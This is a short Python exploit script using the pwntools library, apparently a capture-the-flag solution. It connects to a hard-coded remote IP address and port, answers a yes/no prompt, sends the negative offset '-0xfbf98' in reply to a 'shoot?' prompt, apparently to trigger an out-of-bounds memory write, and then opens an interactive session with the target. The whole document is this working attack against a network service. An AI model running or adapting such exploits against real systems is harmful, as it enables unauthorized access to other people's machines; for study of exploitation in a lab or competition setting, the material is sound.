from pwn import *

r = remote("193.57.159.27",47836)

r.sendlineafter('[yes/no]: ', 'yes')

r.sendlineafter('shoot?\n', '-0xfbf98')

r.interactive()
